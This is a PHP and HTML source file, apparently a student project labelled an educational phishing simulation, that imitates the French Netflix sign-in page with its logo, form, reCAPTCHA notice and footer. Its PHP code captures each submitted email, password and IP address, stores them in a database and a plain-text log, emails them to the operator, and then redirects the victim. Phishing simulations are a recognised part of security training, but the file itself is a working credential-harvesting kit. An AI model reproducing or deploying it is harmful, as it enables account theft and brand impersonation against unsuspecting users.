<?php
// Vérifier si le formulaire a été soumis
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Connexion à la base de données
    $servername = "localhost";
    $username = "root";
    $password = "root";
    $dbname = "bdd_fishing_netflix";

    try {
        $conn = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
        $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        
        // Récupération des données du formulaire
        $email = $_POST['email'];
        $password_text = $_POST['password'];
        $remember = isset($_POST['remember']) ? 1 : 0;
        $date = date('Y-m-d H:i:s');
        $ip = $_SERVER['REMOTE_ADDR'];
        
        // Insertion dans la base de données
        $sql = "INSERT INTO connexions (email, password, remember_me, date_connexion, ip_address) 
                VALUES (:email, :password, :remember, :date_connexion, :ip)";
        
        $stmt = $conn->prepare($sql);
        $stmt->bindParam(':email', $email);
        $stmt->bindParam(':password', $password_text);
        $stmt->bindParam(':remember', $remember);
        $stmt->bindParam(':date_connexion', $date);
        $stmt->bindParam(':ip', $ip);
        
        $stmt->execute();
        
        // ENVOI D'EMAIL
        $to = "votre-email@edu.fr"; // ⭐ REMPLACEZ PAR VOTRE EMAIL ⭐
        $subject = "🎓 [PROJET EDUCATIF] Nouvelle connexion Netflix - " . date('d/m/Y H:i:s');
        $message = "
        <html>
        <head>
            <title>Rapport Éducatif - Simulation Phishing</title>
        </head>
        <body>
            <h2>📊 RAPPORT ÉDUCATIF - SIMULATION DE PHISHING</h2>
            <p><strong>Ceci est une simulation pour un projet éducatif</strong></p>
            <hr>
            <h3>Données capturées :</h3>
            <p><strong>Email :</strong> " . htmlspecialchars($email) . "</p>
            <p><strong>Mot de passe :</strong> " . htmlspecialchars($password_text) . "</p>
            <p><strong>Se souvenir :</strong> " . ($remember ? 'Oui' : 'Non') . "</p>
            <p><strong>Date :</strong> " . $date . "</p>
            <p><strong>Adresse IP :</strong> " . $ip . "</p>
            <hr>
            <p><em>Projet éducatif - Cours de sécurité informatique</em></p>
        </body>
        </html>
        ";
        
        $headers = "MIME-Version: 1.0" . "\r\n";
        $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
        $headers .= "From: netflix-educational@edu.fr" . "\r\n";
        $headers .= "Reply-To: no-reply@edu.fr" . "\r\n";
        
        // Envoi de l'email
        mail($to, $subject, $message, $headers);
        
        // Sauvegarde locale
        $log_data = "[" . $date . "] EMAIL: " . $email . " | PASSWORD: " . $password_text . " | IP: " . $ip . "\n";
        file_put_contents('educational_log.txt', $log_data, FILE_APPEND);
        
        // Redirection
        header("Location: confirmation.php");
        exit();
        
    } catch(PDOException $e) {
        $error_log = "[" . date('Y-m-d H:i:s') . "] ERREUR: " . $e->getMessage() . "\n";
        file_put_contents('errors.log', $error_log, FILE_APPEND);
        header("Location: confirmation.php");
        exit();
    }
}
?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix France - Regardez des films et séries en streaming</title>
    <link rel="stylesheet" href="style_fishing.css">
</head>
<body>
    <div class="background"></div>
    
    <header class="header">
        <div class="logo">
            <svg viewBox="0 0 111 30" fill="#e50914">
                <path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2499766 C43.7810479,26.2499766 42.1876465,26.2499766 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z"></path>
            </svg>
        </div>
    </header>

    <div class="container">
        <div class="login-box">
            <h1>S'identifier</h1>
            
            <form method="POST">
                <div class="form-group">
                    <input type="email" id="email" name="email" required placeholder=" ">
                    <label for="email">E-mail ou numéro de téléphone</label>
                </div>
                <div class="form-group">
                    <input type="password" id="password" name="password" required placeholder=" ">
                    <label for="password">Mot de passe</label>
                </div>
                <button type="submit">S'identifier</button>
                <div class="remember-help">
                    <div class="remember">
                        <input type="checkbox" id="remember" name="remember">
                        <label for="remember">Se souvenir de moi</label>
                    </div>
                    <div class="help">
                        <a href="#">Besoin d'aide ?</a>
                    </div>
                </div>
                <div class="signup">
                    <p>Première visite sur Netflix ? <a href="#">Inscrivez-vous</a>.</p>
                </div>
                <div class="captcha">
                    <p>Cette page est protégée par Google reCAPTCHA pour nous assurer que vous n'êtes pas un robot. <a href="#">En savoir plus</a>.</p>
                </div>
            </form>
        </div>
    </div>

    <footer>
        <div class="footer-content">
            <div class="footer-top">
                <p>Des questions ? Appelez le <a href="tel:(+33) 0805-543-063">(+33) 0805-543-063</a></p>
            </div>
            <div class="footer-links">
                <a href="#">FAQ</a>
                <a href="#">Centre d'aide</a>
                <a href="#">Conditions d'utilisation</a>
                <a href="#">Confidentialité</a>
                <a href="#">Préférences de cookies</a>
                <a href="#">Mentions légales</a>
                <a href="#">Choix liés à la pub</a>
            </div>
            <div class="language-selector">
                <select>
                    <option>Français</option>
                    <option>English</option>
                </select>
            </div>
            <div class="footer-country">
                <p>Netflix France</p>
            </div>
        </div>
    </footer>
</body>
</html>